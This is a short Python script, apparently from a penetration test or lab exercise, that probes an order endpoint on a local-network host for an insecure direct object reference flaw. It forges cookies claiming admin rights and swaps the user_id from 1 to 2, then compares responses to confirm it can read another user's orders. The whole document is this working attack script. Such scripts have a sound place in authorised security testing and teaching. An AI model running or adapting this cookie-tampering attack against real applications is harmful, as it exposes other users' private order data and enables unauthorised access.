import requests

target = "http://192.168.0.28:3000/order"

# Normal Admin Cookie (user_id=1)
cookies_admin = {
    'user': 'admin',
    'isAdmin': 'true',
    'user_id': '1'
}

print(f"Testing IDOR on {target}")

# 1. Check own orders (ID=1)
print("Checking ID=1 (Own)...")
res1 = requests.get(target, cookies=cookies_admin)
if res1.status_code == 200:
    print(f"ID=1 Content Length: {len(res1.text)}")
else:
    print(f"ID=1 Failed: {res1.status_code}")

# 2. Check other user (ID=2) - modifying cookie
cookies_victim = {
    'user': 'admin', # Keeping session valid
    'isAdmin': 'true',
    'user_id': '2'   # TAMPERING HERE
}

print("Checking ID=2 (Victim) by tampering cookie...")
res2 = requests.get(target, cookies=cookies_victim)

if res2.status_code == 200:
    print(f"ID=2 Content Length: {len(res2.text)}")
    if res1.text != res2.text:
        print("[+] IDOR Confirmed! Content differs for ID=2.")
        # Try to extract some unique info if possible
        if "Order #" in res2.text:
            print("Found 'Order #' in response.")
    else:
        print("[-] Content appears identical. Might handle ID server-side from session or no orders.")
else:
    print(f"[-] ID=2 Failed: {res2.status_code}")

